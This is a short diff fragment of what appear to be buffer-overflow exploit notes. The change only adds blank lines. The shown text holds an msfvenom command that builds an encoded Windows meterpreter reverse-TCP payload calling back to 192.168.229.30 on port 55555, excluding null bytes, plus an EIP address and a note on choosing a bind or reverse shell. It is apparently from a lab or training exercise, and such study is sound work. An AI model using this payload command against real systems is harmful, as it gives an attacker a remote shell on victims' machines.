@@ -77,5 +77,7 @@ with socket.socket() as fuzz:
 ```msfvenom
 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.229.30 lport=55555 -e x86/shikata_ga_nai -b '\x00' -f python
 ```
+
 EIP = 7792dc9d
+
 ## NOTE: You can choose to do a BIND or REVERSE shell or try both
